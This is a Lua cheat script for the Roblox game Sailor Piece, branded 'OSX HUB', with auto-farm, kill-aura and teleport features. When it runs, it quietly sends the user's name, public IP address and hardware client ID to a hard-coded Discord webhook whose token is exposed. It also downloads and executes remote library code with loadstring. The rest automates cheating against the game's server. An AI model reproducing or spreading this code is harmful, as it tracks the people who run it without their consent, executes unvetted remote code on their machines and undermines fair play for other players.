-- [[ OSX HUB - REAL NOT FAKE ]] --
-- UI Version: 4.0.41
-- Developer: LilYouDev1997

local successName, GameInfo = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
local GameName = successName and GameInfo.Name or "Sailor Piece"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local successIP, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰าริปต์.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    localPlayer.Name, GameName, hwid, "None", (successIP and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()

local OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()


getgenv().AutoFarm = false
getgenv().AcceptQuest = true


local function CheckQuests()
    local MyQue = {}
    local MyLevels = game:GetService("Players").LocalPlayer.Data.Level.Value

    if MyLevels >= 1 and MyLevels <= 99 then
        table.insert(MyQue, {
            [1] = "Thief",
            [2] = "QuestNPC1",
            [3] = "Thief Hunter",
            [4] = CFrame.new(162.14852905273438, 14.179511070251465, -190.9802703857422)
        });
    elseif MyLevels >= 100 and MyLevels <= 249 then
        table.insert(MyQue, {
            [1] = "ThiefBoss",
            [2] = "QuestNPC2",
            [3] = "Thief Boss",
            [4] = CFrame.new(13.332612037658691, 3.1142590045928955, -198.4281768798828),
        });
    elseif MyLevels >= 250 and MyLevels <= 499 then
        table.insert(MyQue, {
            [1] = "Monkey",
            [2] = "QuestNPC3",
            [3] = "Monkey Hunter",
            [4] = CFrame.new(-512.1484985351562, -0.9778360724449158, 420.5361022949219),
        });
    elseif MyLevels >= 500 and MyLevels <= 749 then
        table.insert(MyQue, {
            [1] = "MonkeyBoss",
            [2] = "QuestNPC4",
            [3] = "Monkey Boss",
            [4] = CFrame.new(-512.1484985351562, -0.9778360724449158, 420.5361022949219),
        });
    elseif MyLevels >= 750 and MyLevels <= 999 then
        table.insert(MyQue, {
            [1] = "DesertBandit",
            [2] = "QuestNPC5",
            [3] = "Desert Bandit Hunter",
            [4] = CFrame.new(-762.2926635742188, -4.222726821899414, -417.2239074707031),
        });
    elseif MyLevels >= 1000 and MyLevels <= 1499 then
        table.insert(MyQue, {
            [1] = "DesertBoss",
            [2] = "QuestNPC6",
            [3] = "Desert Bandit Boss",
            [4] = CFrame.new(-889.2324829101562, 2.3461287021636963, -481.8608093261719),
        });
    elseif MyLevels >= 1500 and MyLevels <= 1999 then
        table.insert(MyQue, {
            [1] = "FrostRogue",
            [2] = "QuestNPC7",
            [3] = "Frost Rogue Hunter",
            [4] = CFrame.new(-389.1451416015625, -1.6711931228637695, -954.271728515625),
        });
    elseif MyLevels >= 2000 and MyLevels <= 2999 then
        table.insert(MyQue, {
            [1] = "SnowBoss",
            [2] = "QuestNPC8",
            [3] = "Winter Warden Boss",
            [4] = CFrame.new(-573.08251953125, 22.642560958862305, -1016.21533203125),
        });
    elseif MyLevels >= 3000 and MyLevels <= 3999 then
        table.insert(MyQue, {
            [1] = "Sorcerer",
            [2] = "QuestNPC9",
            [3] = "Sorcerer Hunter",
            [4] = CFrame.new(1430.1561279296875, 8.557917594909668, 426.21075439453125),
        });
    elseif MyLevels >= 4000 and MyLevels <= 4999 then
        table.insert(MyQue, {
            [1] = "PandaMiniBoss",
            [2] = "QuestNPC10",
            [3] = "Panda Sorcerer Boss",
            [4] = CFrame.new(1622.99169921875, 8.62723445892334, 432.93438720703125),
        });
    elseif MyLevels >= 5000 and MyLevels <= 6249 then
        table.insert(MyQue, {
            [1] = "Hollow",
            [2] = "QuestNPC11",
            [3] = "Hollow Hunter",
            [4] = CFrame.new(-289.10089111328125, -3.365978956222534, 1034.6817626953125),
        });
    elseif MyLevels >= 6250 and MyLevels <= 6999 then
        table.insert(MyQue, {
            [1] = "StrongSorcerer",
            [2] = "QuestNPC12",
            [3] = "Strong Sorcerer Hunter",
            [4] = CFrame.new(612.2385864257812, 1.8869075775146484, -1625.59033203125),
        });
    elseif MyLevels >= 7000 and MyLevels <= 7999 then
        table.insert(MyQue, {
            [1] = "Curse",
            [2] = "QuestNPC13",
            [3] = "Curse Hunter",
            [4] = CFrame.new(-4.170623779296875, 1.8936476707458496, -1975.207275390625),
        });
    elseif MyLevels >= 8000 and MyLevels <= 8999 then
        table.insert(MyQue, {
            [1] = "Slime",
            [2] = "QuestNPC14",
            [3] = "Slime Warrior Hunter",
            [4] = CFrame.new(-1184.136962890625, 18.11712074279785, 339.3919982910156),
        });
    elseif MyLevels >= 9000 and MyLevels <= 9999 then
        table.insert(MyQue, {
            [1] = "AcademyTeacher",
            [2] = "QuestNPC15",
            [3] = "Academy Challenge",
            [4] = CFrame.new(1023.01513671875, 1.4632163047790527, 1245.7381591796875),
        });
    elseif MyLevels >= 10000 and MyLevels <= 11499 then
        table.insert(MyQue, {
            [1] = "Swordsman",
            [2] = "QuestNPC16",
            [3] = "Blade Masters",
            [4] = CFrame.new(-1161.9775390625, 2.500000476837158, -1189.3240966796875),
        });
    elseif MyLevels >= 11500 and MyLevels <= 11999 then
        table.insert(MyQue, {
            [1] = "Ninja",
            [2] = "QuestNPC18",
            [3] = "Ninja Slayer",
            [4] = CFrame.new(-1161.9775390625, 2.500000476837158, -1189.3240966796875),
        });
    elseif MyLevels >= 12000 then
        table.insert(MyQue, {
            [1] = "ArenaFighter",
            [2] = "QuestNPC19",
            [3] = "Arena Takedown",
            [4] = CFrame.new(-1161.9775390625, 2.500000476837158, -1189.3240966796875),
        });
    end;
    return MyQue
end

local function EquipTool(ToolSe)
    pcall(function()
        local player = game.Players.LocalPlayer
        if player.Backpack:FindFirstChild(ToolSe) then
            local tool = player.Backpack:FindFirstChild(ToolSe)
            task.wait(0.4)
            player.Character.Humanoid:EquipTool(tool)
        end
    end)
end

local function UseSkills()
    for i = 1, 2 do 
        game:GetService("ReplicatedStorage").AbilitySystem.Remotes.RequestAbility:FireServer(i)
        task.wait(0.1)
    end
end

local function Teleports(...)
    local RealtargetPos = {...}
    local targetPos = RealtargetPos[1]
    local RealTarget

    if type(targetPos) == "vector" then
        RealTarget = CFrame.new(math.floor(targetPos))
    elseif typeof(targetPos) == "CFrame" then
        RealTarget = targetPos
    elseif type(targetPos) == "number" then
        RealTarget = CFrame.new(unpack(RealtargetPos))
    end

    local player = game.Players.LocalPlayer
    if not player.Character then return end
    local humanoid = player.Character:WaitForChild("Humanoid", 5)
    local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart", 5)
    
    if not humanoid or not humanoidRootPart then return end

    if humanoid.Health == 0 then
        repeat task.wait() until humanoid.Health > 0
    end

    local Distance = (RealTarget.Position - humanoidRootPart.Position).Magnitude
    if Distance <= 210 then
        humanoidRootPart.CFrame = RealTarget
        return
    end

    local Speed = (Distance < 300) and 70 or 75
    local tween = game:GetService("TweenService"):Create(
        humanoidRootPart,
        TweenInfo.new(Distance / Speed, Enum.EasingStyle.Linear),
        {CFrame = RealTarget}
    )
    tween:Play()
    
    local tweenfunc = {}
    function tweenfunc:Stop() tween:Cancel() end
    function tweenfunc:Wait() tween.Completed:Wait() end
    
    tween.Completed:Wait()
    return tweenfunc
end

local Window = OSX:CreateWindow({
    Title = "OSX HUB | " .. GameName,
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

local TabInfo = Window:AddTab({ Title = "info", Icon = "info", SubDescription = "Script Information" })

local DevPanel = TabInfo:AddPanel("Developer Panel")
DevPanel:AddInfoLabel("Owner", "darkmxde.")
DevPanel:AddInfoLabel("Developer", "LilYouDev1997")
DevPanel:AddInfoLabel("Last Update", "28/04/2026")

DevPanel:AddButton({
    Title = "Join Discord",
    Description = "คลิกเพื่อคัดลอกลิงก์ Discord",
    Callback = function()
        setclipboard("https://discord.gg/osxhub")
        OSX:Notify({
            Title = "OSX HUB",
            Content = "Discord link copied to clipboard!",
            Type = "Info"
        })
    end
})

local TabTeleports = Window:AddTab({ Title = "Teleports", Icon = "map", SubDescription = "Teleport Features" })
local TabAutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "sword", SubDescription = "Auto Farming Features" })

getgenv().AutoAttack = false
getgenv().KillAura = false
getgenv().KillAuraRange = 50
getgenv().KillAuraSpeed = 0.15


local TeleportPanel = TabTeleports:AddPanel("Island Teleports")
local NPCTeleportPanel = TabTeleports:AddPanel("NPC Teleports")

local IslandList = {"Starter", "Jungle", "Desert", "Snow", "Sailor", "Shibuya", "HuecoMundo", "Boss", "Dungeon", "Shinjuku", "Valentine", "Slime", "Academy", "Judgement", "SoulSociety"}

TeleportPanel:AddDropdown({
    Title = "Select Island",
    Description = "วาร์ปไปยังเกาะต่างๆ",
    Values = IslandList,
    Callback = function(Value)
        if Value then
            game:GetService("ReplicatedStorage").Remotes.TeleportToPortal:FireServer(Value)
        end
    end
})

local QuestNPCs = {}
for i = 1, 20 do table.insert(QuestNPCs, "QuestNPC" .. i) end

NPCTeleportPanel:AddDropdown({
    Title = "Select Quest NPC",
    Description = "วาร์ปไปหา NPC รับเควส",
    Values = QuestNPCs,
    Callback = function(Value)
        if Value then
            local npc = workspace:FindFirstChild(Value) or workspace.ServiceNPCs:FindFirstChild(Value)
            if npc then
                Teleports(npc:GetPivot() * CFrame.new(0, 5, 0))
            else
                OSX:Notify({
                    Title = "Teleport Error",
                    Content = "ไม่พบ NPC ในเซิร์ฟเวอร์นี้",
                    Type = "Error"
                })
            end
        end
    end
})

NPCTeleportPanel:AddButton({
    Title = "Teleport to Misc NPCs",
    Description = "วาร์ปไปหา NPC พิเศษอื่นๆ",
    Callback = function()
        
    end
})


local CombatPanel = TabAutoFarm:AddPanel("Combat Automation")

CombatPanel:AddToggle({
    Title = "Auto Farm Quest",
    Description = "ฟาร์มเควสตามเลเวลอัตโนมัติ | โค้ตโดย @Forst (LLAMA Officalis)",
    Default = false,
    Callback = function(Value)
        getgenv().AutoFarm = Value
    end
})

CombatPanel:AddToggle({
    Title = "Auto Accept Quest",
    Description = "รับเควสตามเลเวลอัตโนมัติ | โค้ตโดย @Forst (LLAMA Officalis)",
    Default = true,
    Callback = function(Value)
        getgenv().AcceptQuest = Value
    end
})

CombatPanel:AddToggle({
    Title = "Auto Attack",
    Description = "โจมตีอัตโนมัติตลอดเวลา",
    Default = false,
    Callback = function(Value)
        getgenv().AutoAttack = Value
    end
})

CombatPanel:AddToggle({
    Title = "Kill Aura",
    Description = "โจมตีศัตรูรอบตัวอัตโนมัติ",
    Default = false,
    Callback = function(Value)
        getgenv().KillAura = Value
    end
})

CombatPanel:AddSlider({
    Title = "Aura Range",
    Description = "ระยะของการใช้ Kill Aura",
    Min = 10,
    Max = 500,
    Default = 50,
    Rounding = 0,
    Callback = function(Value)
        getgenv().KillAuraRange = Value
    end
})

CombatPanel:AddSlider({
    Title = "Aura Speed",
    Description = "ความเร็วของ Kill Aura (CD)",
    Min = 0.05,
    Max = 1,
    Default = 0.15,
    Rounding = 2,
    Callback = function(Value)
        getgenv().KillAuraSpeed = Value
    end
})

task.spawn(function()
    while task.wait() do
        if getgenv().AutoAttack then
            pcall(function()
                game:GetService("ReplicatedStorage").CombatSystem.Remotes.RequestHit:FireServer()
            end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        if getgenv().KillAura then
            pcall(function()
                local character = game.Players.LocalPlayer.Character
                if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                local hrp = character.HumanoidRootPart
                local range = getgenv().KillAuraRange or 50
                
                local targets = {}
                for _, v in pairs(workspace.NPCs:GetChildren()) do
                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                        local dist = (hrp.Position - v.HumanoidRootPart.Position).Magnitude
                        if dist <= range then
                            table.insert(targets, v)
                        end
                    end
                end

                if #targets > 0 then
                    EquipTool("Katana")
                    
                    
                    for _, target in pairs(targets) do
                        game:GetService("ReplicatedStorage").CombatSystem.Remotes.RequestHit:FireServer(target.HumanoidRootPart.Position)
                    end
                end
            end)
            task.wait(getgenv().KillAuraSpeed)
        end
    end
end)



task.spawn(function()
    while task.wait() do
        if getgenv().AutoFarm then
            pcall(function()
                local questInfo = CheckQuests()[1]
                if not questInfo then return end

                if getgenv().AcceptQuest then
                    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
                    if playerGui and playerGui:FindFirstChild("QuestUI") then
                        local questFrame = playerGui.QuestUI.Quest
                        if questFrame.Visible == false then
                            task.wait(0.5)
                            game:GetService("ReplicatedStorage").RemoteEvents.QuestAccept:FireServer(questInfo[2])
                        elseif questFrame.Visible == true then
                            local titleText = questFrame.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text
                            if not string.find(titleText, questInfo[3]) then
                                task.wait(0.5)
                                game:GetService("ReplicatedStorage").RemoteEvents.QuestAbandon:FireServer("repeatable")
                            end
                        end
                    end
                end

                local targetNPC = nil
                local lastDist = math.huge
                local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                
                if hrp then
                    for _, v in pairs(workspace.NPCs:GetChildren()) do
                        if string.find(v.Name, questInfo[1]) then
                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                local dist = (hrp.Position - v.HumanoidRootPart.Position).Magnitude
                                if dist < lastDist then
                                    lastDist = dist
                                    targetNPC = v
                                end
                            end
                        end
                    end
                end

                if targetNPC then
                    npcFound = true
                    EquipTool("Katana")
                    
                    
                    local targetCFrame = targetNPC.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(-math.pi/2, 0, 0)
                    Teleports(targetCFrame)
                    
                    
                    if hrp then
                        hrp.CFrame = targetCFrame
                    end
                    
                    targetNPC.HumanoidRootPart.CanCollide = false
                    targetNPC.Humanoid.JumpPower = 0
                    targetNPC.Humanoid.WalkSpeed = 0
                    
                    pcall(function()
                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                    end)
                end
                
                if not npcFound then
                    Teleports(questInfo[4])
                end
            end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        pcall(function()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if getgenv().AutoFarm and character and character:FindFirstChild("HumanoidRootPart") then
                local hrp = character.HumanoidRootPart
                
                local root = character:FindFirstChild("Root")
                if not root then 
                    root = Instance.new("Part")
                    root.Name = "Root"
                    root.Size = Vector3.new(15, 1, 15)
                    root.Anchored = true
                    root.Transparency = 1
                    root.CanCollide = true
                    root.Parent = character
                end
              
                root.CFrame = CFrame.new(hrp.Position + Vector3.new(0, -3.5, 0))
        
                if not hrp:FindFirstChild("BodyVelocity1") then
                    local humanoid = character:FindFirstChild("Humanoid")
                    if humanoid and humanoid.Sit then
                        humanoid.Sit = false
                    end
                    local BodyVelocity = Instance.new("BodyVelocity")
                    BodyVelocity.Name = "BodyVelocity1"
                    BodyVelocity.Parent = hrp
                    BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                end
                
                for _, v in pairs(character:GetDescendants()) do
                    if v:IsA("BasePart") and v.Name ~= "Root" then
                        v.CanCollide = false
                    end
                end
            else
                if character then
                    local root = character:FindFirstChild("Root")
                    if root then root:Destroy() end
                    
                    local hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local bv = hrp:FindFirstChild("BodyVelocity1")
                        if bv then bv:Destroy() end
                    end
                end
            end
        end)
    end
end)

OSX:Notify({
    Title = "OSX HUB",
    Content = GameName .. " script ready!",
    Type = "Success",
    Duration = 5
})

print("DEBUG [OSX]: UI Loaded successfully")
